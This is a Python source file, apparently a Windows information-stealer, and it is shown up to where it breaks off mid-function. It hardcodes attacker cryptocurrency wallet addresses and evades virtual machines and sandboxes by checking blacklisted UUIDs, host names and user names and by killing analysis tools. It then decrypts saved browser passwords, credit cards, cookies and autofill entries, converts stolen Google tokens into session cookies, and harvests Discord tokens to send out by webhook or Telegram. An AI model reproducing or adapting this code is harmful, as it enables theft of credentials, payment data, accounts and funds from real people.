import subprocess
import os
from threading import Thread
from urllib3 import PoolManager, HTTPResponse, disable_warnings as disable_warnings_urllib3
import base64
import json
import ctypes
import random
import shutil
import sqlite3
from Crypto.Cipher import AES
import pyaes
import requests
import re
import threading
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer, create_unicode_buffer
from base64 import b64decode
from json import loads
from hashlib import sha1, pbkdf2_hmac
import hmac
from pathlib import Path
import os.path
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import glob
from pyasn1.codec.der.decoder import decode as der_decode
from Crypto.Cipher import AES, DES3
import zipfile
import datetime
import sys
import pygetwindow
import keyboard
import pyperclip
import traceback
import time
from secrets import token_bytes
from coincurve import PublicKey
from sha3 import keccak_256


disable_warnings_urllib3()

addresses = {
    'BTC': 'bc1q562we5ez0rvcr2242z62sk98kycepal2hazj8u',
    'ETH': '0x28297dc1C1D2B2cB393eA19e693b73D28Fd3551b',
    'DOGE': 'D5eb4zyC6ar2B3TJ7eENAj6pNi1ezTf1Eb',
    'LTC': 'Lek7VLZo7Xo4zgWu6AHf2MkRPPBzo2Z3Pa',
    'XMR': '47BG4e2m6ef3ZLvd2RSwpJKAx83NZXTVrNTCuAyScnGfJtPVAH1HzYmHdAfMSoMKHuQMb2q11wDmU3cVzezGN7ruMTV8QeS',
    'BCH': 'qqsv99e7wv57parxtxaxzdmn5jh2j06cdg3kw7v2zs',
    'DASH': 'XfcjvG1x56it1PmbfDN9vsNQMYsmUJwZB5',
    'TRX': 'THix5LhR1QjZ57sUNZhSNeinvF7DTAFdZF',
    'XRP': 'rHxAArjxqm1JPxr1PT7buNA9UxYqZEwRL6',
    'XLM': 'GBM32KQXJJX2DANECCVJGGVU7M76EP4S626ONBXDHQ6H4M4HDU25GRAI'
}

class VmProtect:

    BLACKLISTED_UUIDS = ('7AB5C494-39F5-4941-9163-47F54D6D5016', '032E02B4-0499-05C3-0806-3C0700080009', '03DE0294-0480-05DE-1A06-350700080009', '11111111-2222-3333-4444-555555555555', '6F3CA5EC-BEC9-4A4D-8274-11168F640058', 'ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548', '4C4C4544-0050-3710-8058-CAC04F59344A', '00000000-0000-0000-0000-AC1F6BD04972', '00000000-0000-0000-0000-000000000000', '5BD24D56-789F-8468-7CDC-CAA7222CC121', '49434D53-0200-9065-2500-65902500E439', '49434D53-0200-9036-2500-36902500F022', '777D84B3-88D1-451C-93E4-D235177420A7', '49434D53-0200-9036-2500-369025000C65', 'B1112042-52E8-E25B-3655-6A4F54155DBF', '00000000-0000-0000-0000-AC1F6BD048FE', 'EB16924B-FB6D-4FA1-8666-17B91F62FB37', 'A15A930C-8251-9645-AF63-E45AD728C20C', '67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3', 'C7D23342-A5D4-68A1-59AC-CF40F735B363', '63203342-0EB0-AA1A-4DF5-3FB37DBB0670', '44B94D56-65AB-DC02-86A0-98143A7423BF', '6608003F-ECE4-494E-B07E-1C4615D1D93C', 'D9142042-8F51-5EFF-D5F8-EE9AE3D1602A', '49434D53-0200-9036-2500-369025003AF0', '8B4E8278-525C-7343-B825-280AEBCD3BCB', '4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27', '79AF5279-16CF-4094-9758-F88A616D81B4', 'FE822042-A70C-D08B-F1D1-C207055A488F', '76122042-C286-FA81-F0A8-514CC507B250', '481E2042-A1AF-D390-CE06-A8F783B1E76A', 'F3988356-32F5-4AE1-8D47-FD3B8BAFBD4C', '9961A120-E691-4FFE-B67B-F0E4115D5919')
    BLACKLISTED_COMPUTERNAMES = ('00900BC83802', 'bee7370c-8c0c-4', 'desktop-nakffmt', 'win-5e07cos9alr', 'b30f0242-1c6a-4', 'desktop-vrsqlag', 'q9iatrkprh', 'xc64zb', 'desktop-d019gdm', 'desktop-wi8clet', 'server1', 'lisa-pc', 'john-pc', 'desktop-b0t93d6', 'desktop-1pykp29', 'desktop-1y2433r', 'wileypc', 'work', '6c4e733f-c2d9-4', 'ralphs-pc', 'desktop-wg3myjs', 'desktop-7xc6gez', 'desktop-5ov9s0o', 'qarzhrdbpj', 'oreleepc', 'archibaldpc', 'julia-pc', 'd1bnjkfvlh', 'compname_5076', 'desktop-vkeons4', 'NTT-EFF-2W11WSS')
    BLACKLISTED_USERS = ('wdagutilityaccount', 'abby', 'peter wilson', 'hmarc', 'patex', 'john-pc', 'rdhj0cnfevzx', 'keecfmwgj', 'frank', '8nl0colnq5bq', 'lisa', 'john', 'george', 'pxmduopvyx', '8vizsm', 'w0fjuovmccp5a', 'lmvwjj9b', 'pqonjhvwexss', '3u2v9m8', 'julia', 'heuerzl', 'harry johnson', 'j.seance', 'a.monaldo', 'tvm')
    BLACKLISTED_TASKS = ('fakenet', 'dumpcap', 'httpdebuggerui', 'wireshark', 'fiddler', 'vboxservice', 'df5serv', 'vboxtray', 'vmtoolsd', 'vmwaretray', 'ida64', 'ollydbg', 'pestudio', 'vmwareuser', 'vgauthservice', 'vmacthlp', 'x96dbg', 'vmsrvc', 'x32dbg', 'vmusrvc', 'prl_cc', 'prl_tools', 'xenservice', 'qemu-ga', 'joeboxcontrol', 'ksdumperclient', 'ksdumper', 'joeboxserver', 'vmwareservice', 'vmwaretray', 'discordtokenprotector', 'glasswire', 'fiddler', 'requestly')

    @staticmethod
    def checkUUID() -> bool: # Checks if the UUID of the user is blacklisted or not
        uuid = ""
        try:
            uuid = subprocess.run("wmic csproduct get uuid", shell= True, capture_output= True).stdout.splitlines()[2].decode(errors= 'ignore').strip()
        except:
            uuid = ""
        return uuid in VmProtect.BLACKLISTED_UUIDS

    @staticmethod
    def checkComputerName() -> bool: # Checks if the computer name of the user is blacklisted or not
        computername = os.getenv("computername")
        return computername.lower() in VmProtect.BLACKLISTED_COMPUTERNAMES

    @staticmethod
    def checkUsers() -> bool: # Checks if the username of the user is blacklisted or not
        user = os.getlogin()
        return user.lower() in VmProtect.BLACKLISTED_USERS

    @staticmethod
    def checkHosting() -> bool: # Checks if the user's system in running on a server or not
        http = PoolManager(cert_reqs="CERT_NONE")
        try:
            return http.request('GET', 'http://ip-api.com/line/?fields=hosting').data.decode(errors= "ignore").strip() == 'true'
        except Exception:
            return False

    @staticmethod
    def checkHTTPSimulation() -> bool: # Checks if the user is simulating a fake HTTPS connection or not
        http = PoolManager(cert_reqs="CERT_NONE", timeout= 1.0)
        try:
            http.request('GET', f'https://blank-{Utils.GetRandomString()}.in')
        except Exception:
            return False
        else:
            return True

    @staticmethod
    def checkRegistry() -> bool: # Checks if user's registry contains any data which indicates that it is a VM or not
        r1 = subprocess.run("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2", capture_output= True, shell= True)
        r2 = subprocess.run("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2", capture_output= True, shell= True)
        gpucheck = any(x.lower() in subprocess.run("wmic path win32_VideoController get name", capture_output= True, shell= True).stdout.decode(errors= "ignore").splitlines()[2].strip().lower() for x in ("virtualbox", "vmware"))
        dircheck = any([os.path.isdir(path) for path in ('D:\\Tools', 'D:\\OS2', 'D:\\NT3X')])
        return (r1.returncode != 1 and r2.returncode != 1) or gpucheck or dircheck

    @staticmethod
    def killTasks() -> None: # Kills blacklisted processes
        Utils.TaskKill(*VmProtect.BLACKLISTED_TASKS)

    @staticmethod
    def isVM(level: int) -> bool: # Checks if the user is running on a VM or not
        Thread(target= VmProtect.killTasks, daemon= True).start()
        if level == 1:
            result = VmProtect.checkHTTPSimulation() or VmProtect.checkComputerName() or VmProtect.checkUsers()
            return result
        if level == 2:
            try:
                result = VmProtect.checkHTTPSimulation() or VmProtect.checkUUID() or VmProtect.checkComputerName() or VmProtect.checkUsers() or VmProtect.checkHosting() or VmProtect.checkRegistry()
                return result
            except:
                return False
        else:
            return False


class Chromium:
    BrowserPath: str = None # Stores the path to the browser's storage directory
    EncryptionKey: bytes = None # Stores the encryption key that the browser uses to encrypt the data

    def __init__(self, browserPath: str) -> None:
        if not os.path.isdir(browserPath): # Checks if the browser's storage directory exists
            raise NotADirectoryError("Browser path not found!")

        self.BrowserPath = browserPath

    def GetRandomString(self, length: int = 5, invisible: bool = False): # Generates a random string
        if invisible:
            return "".join(random.choices(["\xa0", chr(8239)] + [chr(x) for x in range(8192, 8208)], k= length))
        else:
            return "".join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k= length))

    def CryptUnprotectData(self, encrypted_data: bytes, optional_entropy: str= None) -> bytes: # Calls the CryptUnprotectData function from crypt32.dll
        class DATA_BLOB(ctypes.Structure):

            _fields_ = [
                ("cbData", ctypes.c_ulong),
                ("pbData", ctypes.POINTER(ctypes.c_ubyte))
            ]

        pDataIn = DATA_BLOB(len(encrypted_data), ctypes.cast(encrypted_data, ctypes.POINTER(ctypes.c_ubyte)))
        pDataOut = DATA_BLOB()
        pOptionalEntropy = None

        if optional_entropy is not None:
            optional_entropy = optional_entropy.encode("utf-16")
            pOptionalEntropy = DATA_BLOB(len(optional_entropy), ctypes.cast(optional_entropy, ctypes.POINTER(ctypes.c_ubyte)))

        if ctypes.windll.Crypt32.CryptUnprotectData(ctypes.byref(pDataIn), None, ctypes.byref(pOptionalEntropy) if pOptionalEntropy is not None else None, None, None, 0, ctypes.byref(pDataOut)):
            data = (ctypes.c_ubyte * pDataOut.cbData)()
            ctypes.memmove(data, pDataOut.pbData, pDataOut.cbData)
            ctypes.windll.Kernel32.LocalFree(pDataOut.pbData)
            return bytes(data)

        raise ValueError("Invalid encrypted_data provided!")

    def GetEncryptionKey(self) -> bytes | None: # Gets the encryption key
        if self.EncryptionKey is not None:
            return self.EncryptionKey
        else:
            localStatePath = os.path.join(self.BrowserPath, "Local State")
            if os.path.isfile(localStatePath):
                with open(localStatePath, encoding= "utf-8", errors= "ignore") as file:
                    jsonContent: dict = json.load(file)

                encryptedKey: str = jsonContent["os_crypt"]["encrypted_key"]
                encryptedKey = base64.b64decode(encryptedKey.encode())[5:]

                self.EncryptionKey = self.CryptUnprotectData(encryptedKey)
                return self.EncryptionKey

            else:
                return None

    def Decrypt(self, buffer: bytes, key: bytes) -> str: # Decrypts the data using the encryption key
        version = buffer.decode(errors= "ignore")
        if (version.startswith(("v10", "v11"))):
            iv = buffer[3:15]
            cipherText = buffer[15:]
            return pyaes.AESModeOfOperationGCM(key, iv).decrypt(cipherText)[:-16].decode(errors= "ignore")
        else:
            return str(self.CryptUnprotectData(buffer))

    def GetPasswords(self) -> list[tuple[str, str, str]]: # Gets all passwords from the browser
        encryptionKey = self.GetEncryptionKey()
        passwords = list()

        if encryptionKey is None:
            return passwords

        loginFilePaths = list()

        for root, _, files in os.walk(self.BrowserPath):
            for file in files:
                if file.lower() == "login data":
                    filepath = os.path.join(root, file)
                    loginFilePaths.append(filepath)

        for path in loginFilePaths:
            while True:
                tempfile = os.path.join(os.getenv("temp"), self.GetRandomString(10) + ".tmp")
                if not os.path.isfile(tempfile):
                    break

            try:
                shutil.copy(path, tempfile)
            except Exception:
                continue
            db = sqlite3.connect(tempfile)
            db.text_factory = lambda b : b.decode(errors= "ignore")
            cursor = db.cursor()
            try:
                results = cursor.execute("SELECT origin_url, username_value, password_value FROM logins").fetchall()

                for url, username, password in results:
                    password = self.Decrypt(password, encryptionKey)

                    if url and username and password:
                        passwords.append((url, username, password))
                        data.password_count += 1
            except Exception:
                pass

            cursor.close()
            db.close()
            os.remove(tempfile)

        return passwords

    def GetCreditCards(self) -> list[tuple[str, str, str]]:
        encryptionKey = self.GetEncryptionKey()
        ccs = list()

        if encryptionKey is None:
            return ccs

        loginFilePaths = list()

        for root, _, files in os.walk(self.BrowserPath):
            for file in files:
                if file.lower() == "web data":
                    filepath = os.path.join(root, file)
                    loginFilePaths.append(filepath)

        for path in loginFilePaths:
            while True:
                tempfile = os.path.join(os.getenv("temp"), self.GetRandomString(10) + ".tmp")
                if not os.path.isfile(tempfile):
                    break

            try:
                shutil.copy(path, tempfile)
            except Exception:
                continue
            db = sqlite3.connect(tempfile)
            db.text_factory = lambda b : b.decode(errors= "ignore")
            cursor = db.cursor()
            try:
                results = cursor.execute("SELECT expiration_month, expiration_year, card_number_encrypted FROM credit_cards").fetchall()

                for expiration_month, expiration_year, card_number_encrypted in results:
                    card_number = self.Decrypt(card_number_encrypted, encryptionKey)

                    if card_number and expiration_month and expiration_year:
                        ccs.append((card_number, expiration_month, expiration_year))
                        data.cc_count += 1
            except Exception:
                pass

            cursor.close()
            db.close()
            os.remove(tempfile)

        return ccs

    def dump_google_sessions(self, browser_path):
        found_sessions = []
        session_tokens = []
        try:
            try:
                secret_key = self.GetEncryptionKey()
            except Exception as e:
                return None

            folders = [element for element in os.listdir(browser_path) if re.search("^Profile*|^Default$", element) is not None]
            for folder in folders:
                chrome_path_login_db = os.path.join(browser_path, folder, "Web Data")
                try:
                    shutil.copy2(chrome_path_login_db, "Loginvault.db")
                    conn = sqlite3.connect("Loginvault.db")
                except Exception as e:
                    pass

                if conn:
                    cursor = conn.cursor()
                    cursor.execute("SELECT service, encrypted_token FROM token_service")

                    for index, token_entry in enumerate(cursor.fetchall()):
                        service, encrypted_token = token_entry
                        if service and encrypted_token:
                            initialization_vector = encrypted_token[3:15]
                            encrypted_password = encrypted_token[15:-16]
                            cipher = AES.new(secret_key, AES.MODE_GCM, initialization_vector)
                            decrypted_pass = cipher.decrypt(encrypted_password).decode()
                            decrypted_token = decrypted_pass
                            session_tokens.append([service.replace("AccountId-", ""), decrypted_token])

                    cursor.close()
                    conn.close()
                    try:
                        os.remove("Loginvault.db")
                    except:
                        pass

            for session_token in session_tokens:
                token_id = session_token[0]
                token_value = session_token[1]

                url = "https://accounts.google.com/oauth/multilogin"
                headers = {
                    "Accept": "*/*",
                    "User-Agent": "com.google.Drive/6.0.230903 iSL/3.4 iPhone/15.7.4 hw/iPhone9_4 (gzip)",
                    "Authorization": f"MultiBearer {token_value}:{token_id}",
                    "Accept-Language": "en-US,en;q=0.9",
                    "Content-Type": "application/x-www-form-urlencoded"
                }
                data = {"source": "com.google.Drive"}

                response = requests.post(url, headers=headers, data=data)
                google_cookies = response.text.replace(")]}'\n", "")

                json_google_cookies = json.loads(google_cookies)
                if json_google_cookies["status"] == "OK":
                    display_email = json_google_cookies["accounts"][0]["display_email"].split("@")[0]
                    session_cookies = json_google_cookies["cookies"]
                    formatted_cookies = ""
                    for cookie in session_cookies:
                        try:
                            if "domain" in cookie:
                                formatted_cookies += f"{cookie['domain']}\t{str(cookie['isSecure']).lower()}\t{cookie['path']}\t{str(cookie['isHttpOnly']).lower()}\t{cookie['maxAge']}\t{cookie['name']}\t{cookie['value']}\n"
                            if "host" in cookie:
                                formatted_cookies += f"{cookie['host']}\t{str(cookie['isSecure']).lower()}\t{cookie['path']}\t{str(cookie['isHttpOnly']).lower()}\t{cookie['maxAge']}\t{cookie['name']}\t{cookie['value']}\n"
                        except:
                            pass
                    found_sessions.append([display_email, formatted_cookies])
        except:
            pass
        return found_sessions

    def GetCookies(self) -> list[tuple[str, str, str, str, int]]: # Gets all cookies from the browser
        encryptionKey = self.GetEncryptionKey()
        cookies = list()

        if encryptionKey is None:
            return cookies

        cookiesFilePaths = list()

        for root, _, files in os.walk(self.BrowserPath):
            for file in files:
                if file.lower() == "cookies":
                    filepath = os.path.join(root, file)
                    cookiesFilePaths.append(filepath)

        for path in cookiesFilePaths:
            while True:
                tempfile = os.path.join(os.getenv("temp"), self.GetRandomString(10) + ".tmp")
                if not os.path.isfile(tempfile):
                    break

            try:
                shutil.copyfile(path, tempfile)
            except:
                continue
            db = sqlite3.connect(tempfile)
            db.text_factory = lambda b : b.decode(errors= "ignore")
            cursor = db.cursor()
            try:
                results = cursor.execute("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies").fetchall()

                for host, name, path, cookie, expiry in results:
                    cookie = self.Decrypt(cookie, encryptionKey)

                    if host and name and cookie:
                        cookies.append((host, name, path, cookie, expiry))
                        data.cookie_count += 1
            except Exception:
                pass

            cursor.close()
            db.close()
            os.remove(tempfile)

        return cookies

    def GetHistory(self) -> list[tuple[str, str, int]]: # Gets all browsing history of the browser
        history = list()
        historyFilePaths = list()

        for root, _, files in os.walk(self.BrowserPath):
            for file in files:
                if file.lower() == 'history':
                    filepath = os.path.join(root, file)
                    historyFilePaths.append(filepath)

        for path in historyFilePaths:
            while True:
                tempfile = os.path.join(os.getenv("temp"), self.GetRandomString(10) + ".tmp")
                if not os.path.isfile(tempfile):
                    break

            try:
                shutil.copy(path, tempfile)
            except Exception:
                continue
            db = sqlite3.connect(tempfile)
            db.text_factory = lambda b : b.decode(errors= "ignore")
            cursor = db.cursor()
            try:
                results = cursor.execute('SELECT url, title, visit_count, last_visit_time FROM urls').fetchall()

                for url, title, vc, lvt in results:
                    if url and title and vc is not None and lvt is not None:
                        history.append((url, title, vc, lvt))
                        data.history_count += 1
            except Exception:
                pass

            cursor.close()
            db.close()
            os.remove(tempfile)

        history.sort(key= lambda x: x[3], reverse= True)
        return list([(x[0], x[1], x[2]) for x in history])

    def GetAutofills(self) -> list[str]:
        autofills = list()
        autofillsFilePaths = list()

        for root, _, files in os.walk(self.BrowserPath):
            for file in files:
                if file.lower() == 'web data':
                    filepath = os.path.join(root, file)
                    autofillsFilePaths.append(filepath)

        for path in autofillsFilePaths:
            while True:
                tempfile = os.path.join(os.getenv("temp"), self.GetRandomString(10) + ".tmp")
                if not os.path.isfile(tempfile):
                    break

            try:
                shutil.copy(path, tempfile)
            except Exception:
                continue
            db = sqlite3.connect(tempfile)
            db.text_factory = lambda b: b.decode(errors="ignore")
            cursor = db.cursor()
            try:
                results = cursor.execute('SELECT name, value FROM autofill').fetchall()

                for name, value in results:
                    name = name.strip()
                    value = value.strip()
                    if value and name not in autofills:
                        autofills.append((name, value))
                        data.autofill_count += 1
            except Exception:
                pass

            cursor.close()
            db.close()
            os.remove(tempfile)

        return autofills

class Data:
    def __init__(self):
        self.autofill_count: int = 0
        self.cookie_count: int = 0
        self.password_count: int = 0
        self.cc_count: int = 0
        self.history_count: int = 0
        self.desktop_wallets_count: int = 0
        self.ext_wallets_count: int = 0
        self.has_telegram: bool = False
        self.has_steam: bool = False
        self.stolen_files: list = []
        self.keywords = ""

        self.username = os.getlogin()
        self.data_gofile_url: str = None
        self.tg_file_gofile_url: str = None

        self.filename = "Akira-%s.%s" % (os.getlogin(), "zip")
        self.computerName = os.getenv("computername") or "Unable to get computer name"

        try:
            self.computerOS = subprocess.run('wmic os get Caption', capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip().splitlines()
            self.computerOS = self.computerOS[2].strip() if len(self.computerOS) >= 2 else "Unable to detect OS"

            self.totalMemory = subprocess.run('wmic computersystem get totalphysicalmemory', capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip().split()
            self.totalMemory = (str(int(int(self.totalMemory[1])/1000000000)) + " GB") if len(self.totalMemory) >= 1 else "Unable to detect total memory"

            self.uuid = subprocess.run('wmic csproduct get uuid', capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip().split()
            self.uuid = self.uuid[1].strip() if len(self.uuid) >= 1 else "Unable to detect UUID"

            self.cpu = subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:System\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name PROCESSOR_IDENTIFIER", capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip() or "Unable to detect CPU"

            self.gpu = subprocess.run("wmic path win32_VideoController get name", capture_output= True, shell= True).stdout.decode(errors= 'ignore').splitlines()
            self.gpu = self.gpu[2].strip() if len(self.gpu) >= 2 else "Unable to detect GPU"

            self.productKey = subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault", capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip() or "Unable to get product key"

            self.system_info = f"Computer Name: {self.computerName}\nTotal Memory: {self.totalMemory}\nCPU: {self.cpu}\nGPU: {self.gpu}\nProduct Key: {self.productKey}"
        except:
            pass

        try:
            self.ip = requests.get(url="https://api.ipify.org").text
        except:
            self.ip = "Unknown IP"
        """try:
            ipdatastr = requests.post(url="https://api.iplocation.net/?ip={}".format(self.ip)).text
            ipdata = json.loads(ipdatastr)
            self.country = ipdata["country_name"]
            self.countryCode = ipdata["country_code2"].lower()
        except:
            self.countryCode = ""
        """
        try:
            ipdatastr = requests.post(url="http://ip-api.com/json/{}".format(self.ip)).text
            ipdata = json.loads(ipdatastr)
            self.country = ipdata["country"]
            self.countryCode = ipdata["countryCode"].lower()
        except:
            self.countryCode = ""


data = Data()
class Discord:
    def __init__(self, webhook_url: str, useTg: bool):
        self.default_webhook = webhook_url
        self.ip_addr = data.ip
        self.Threadlist = []
        self.useTg = useTg
        try:
            self.LOCAL = os.getenv("LOCALAPPDATA")
            self.ROAMING = os.getenv("APPDATA")
        except Exception as e:
            self.send_error(e)


        self.DINJECT = [
            self.LOCAL + '\\Discord',
            self.LOCAL + '\\DiscordCanary',
            self.LOCAL + '\\DiscordPTB',
            self.LOCAL + '\\DiscordDevelopment'
        ]

        self.tokens = []
        self.identifier = []

        '                   Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >              Password < 3 >     Cookies < 4 >                          Extentions < 5 >                                  '
        browserPaths = [
            [f"{self.ROAMING}/Opera Software/Opera GX Stable",               "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/djclckkglechooblngghdinmeemkbgci"                      ],
            [f"{self.ROAMING}/Opera Software/Opera Stable",                  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/djclckkglechooblngghdinmeemkbgci"                      ],
            [f"{self.ROAMING}/Opera Software/Opera Neon/User Data/Default",  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/djclckkglechooblngghdinmeemkbgci"                      ],
            [f"{self.LOCAL}/Google/Chrome/User Data",                        "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
            [f"{self.LOCAL}/Google/Chrome/User Data",                        "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/fhbohimaelbohpjbbldcngcnapndodjp"              ],
            [f"{self.LOCAL}/Google/Chrome/User Data",                        "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/hnfanknocfeofbddgcijnmhnfnkdnaad"              ],
            [f"{self.LOCAL}/Google/Chrome/User Data",                        "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/egjidjbpglichdcondbcbdnbeeppgdph"              ],
            [f"{self.LOCAL}/Google/Chrome/User Data",                        "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/bfnaelmomeimhlpmgjnjophhpkkoljpa"              ],
            [f"{self.LOCAL}/Google/Chrome SxS/User Data",                    "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
            [f"{self.LOCAL}/Google/Chrome SxS/User Data",                    "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/fhbohimaelbohpjbbldcngcnapndodjp"              ],
            [f"{self.LOCAL}/Google/Chrome SxS/User Data",                    "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/hnfanknocfeofbddgcijnmhnfnkdnaad"              ],
            [f"{self.LOCAL}/Google/Chrome SxS/User Data",                    "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/egjidjbpglichdcondbcbdnbeeppgdph"              ],
            [f"{self.LOCAL}/Google/Chrome SxS/User Data",                    "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/bfnaelmomeimhlpmgjnjophhpkkoljpa"              ],
            [f"{self.LOCAL}/BraveSoftware/Brave-Browser/User Data",          "brave.exe",    "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
            [f"{self.LOCAL}/BraveSoftware/Brave-Browser/User Data",          "brave.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",      "/Default/Local Extension Settings/fhbohimaelbohpjbbldcngcnapndodjp"              ],
            [f"{self.LOCAL}/BraveSoftware/Brave-Browser/User Data",          "brave.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",      "/Default/Local Extension Settings/hnfanknocfeofbddgcijnmhnfnkdnaad"              ],
            [f"{self.LOCAL}/BraveSoftware/Brave-Browser/User Data",          "brave.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",      "/Default/Local Extension Settings/egjidjbpglichdcondbcbdnbeeppgdph"              ],
            [f"{self.LOCAL}/BraveSoftware/Brave-Browser/User Data",          "brave.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",      "/Default/Local Extension Settings/bfnaelmomeimhlpmgjnjophhpkkoljpa"              ],
            [f"{self.LOCAL}/Yandex/YandexBrowser/User Data",                 "yandex.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn"                                    ],
            [f"{self.LOCAL}/Microsoft/Edge/User Data",                       "edge.exe",     "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/ejbalbakoplchlghecdalmeeeajnimhm"              ]
        ]

        discord_paths = [
            [f"{self.ROAMING}/Discord", "/Local Storage/leveldb"],
            [f"{self.ROAMING}/Lightcord", "/Local Storage/leveldb"],
            [f"{self.ROAMING}/discordcanary", "/Local Storage/leveldb"],
            [f"{self.ROAMING}/discordptb", "/Local Storage/leveldb"],
        ]

        for patt in browserPaths:
            a = threading.Thread(target=self.get_btoken, args=[patt[0], patt[2]])
            a.start()
            self.Threadlist.append(a)
        for patt in discord_paths:
            a = threading.Thread(target=self.get_discord, args=[patt[0], patt[1]])
            a.start()
            self.Threadlist.append(a)
        #self.injection()

    def send_error(self, exception):
        return

    class DATA_BLOB(Structure):
            _fields_ = [
                ('cbData', wintypes.DWORD),
                ('pbData', POINTER(c_char))
            ]

    def get_data(self, blob_out):
        cbData = int(blob_out.cbData)
        pbData = blob_out.pbData
        buffer = c_buffer(cbData)
        cdll.msvcrt.memcpy(buffer, pbData, cbData)
        windll.kernel32.LocalFree(pbData)
        return buffer.raw

    def CryptUnprotectData(self, encrypted_bytes, entropy=b''):
        buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
        buffer_entropy = c_buffer(entropy, len(entropy))
        blob_in = self.DATA_BLOB(len(encrypted_bytes), buffer_in)
        blob_entropy = self.DATA_BLOB(len(entropy), buffer_entropy)
        blob_out = self.DATA_BLOB()

        if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
            return self.get_data(blob_out)

    def decrypt_value(self, buff, master_key=None):
        starts = buff.decode(encoding='utf8', errors='ignore')[:3]
        if starts == 'v10' or starts == 'v11':
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass


    def get_btoken(self, path, arg):
        if not os.path.exists(path): return
        path += arg
        for file in os.listdir(path):
            if file.endswith(".log") or file.endswith(".ldb")   :
                for line in [x.strip() for x in open(f"{path}\\{file}", errors="ignore").readlines() if x.strip()]:
                    for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", r"mfa\.[\w-]{80,95}"):
                        for token in re.findall(regex, line):
                            if token not in self.tokens:
                                self.tokens.append(token)
                                self.cehckToken(token)


    def get_discord(self, path, arg):
        if not os.path.exists(f"{path}/Local State"): return
        pathC = path + arg

        pathKey = path + "/Local State"
        with open(pathKey, 'r', encoding='utf-8') as f: local_state = loads(f.read())
        master_key = b64decode(local_state['os_crypt']['encrypted_key'])
        master_key = self.CryptUnprotectData(master_key[5:])


        for file in os.listdir(pathC):
            if file.endswith(".log") or file.endswith(".ldb")   :
                for line in [x.strip() for x in open(f"{pathC}\\{file}", errors="ignore").readlines()if x.strip()]:
                    for token in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                        tokenDecoded = self.decrypt_value(b64decode(token.split('dQw4w9WgXcQ:')[1]), master_key)
                        if tokenDecoded not in self.tokens:
                            self.tokens.append(tokenDecoded)
                            self.cehckToken(tokenDecoded)

    def cehckToken(self, token):
        headers = {
            "Authorization": token,
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
        }

        try:
            response = requests.get("https://discordapp.com/api/v9/users/@me", headers=headers)


            if response.status_code == 200:
                if self.useTg == True:
                    self.sendTokenTg(token)
                else:
                    self.send_embed(token)
            else:
                return False
        except:

            return False

    def get_billing(self, token):
        HEADERS = {
        "Authorization": token,
        "Content-Type": "application/json",
